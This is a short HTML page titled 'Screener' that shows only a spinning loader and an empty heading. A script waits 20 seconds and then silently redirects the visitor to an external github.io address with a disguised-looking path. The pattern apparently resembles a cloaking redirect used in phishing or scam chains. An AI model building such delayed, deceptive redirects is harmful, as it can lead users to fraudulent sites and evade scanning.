<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Screener</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #1f1c2c, #928dab);
      color: #fff;
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }

    /* Unique loader: rotating ring with dots */
    .loader {
      position: relative;
      width: 80px;
      height: 80px;
      margin-bottom: 20px;
    }
    .loader div {
      position: absolute;
      width: 12px;
      height: 12px;
      background: #ffcc00;
      border-radius: 50%;
      animation: orbit 1.5s linear infinite;
    }
    .loader div:nth-child(1) { top: 0; left: 34px; animation-delay: 0s; }
    .loader div:nth-child(2) { top: 34px; left: 68px; animation-delay: 0.2s; }
    .loader div:nth-child(3) { top: 68px; left: 34px; animation-delay: 0.4s; }
    .loader div:nth-child(4) { top: 34px; left: 0; animation-delay: 0.6s; }

    @keyframes orbit {
      0% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.5); opacity: 0.6; }
      100% { transform: scale(1); opacity: 1; }
    }

    h1 {
      font-size: 26px;
      margin: 0;
    }
  </style>
</head>
<body>
  <div class="loader">
    <div></div><div></div><div></div><div></div>
  </div>
  <h1></h1>

  <script>
    // Wait 20 seconds, then redirect
    setTimeout(function() {
      window.location.href = "https://survey-quality-tally.github.io/enter.aspx.id-Qualities-01/";
    }, 20000);
  </script>
</body>
</html>
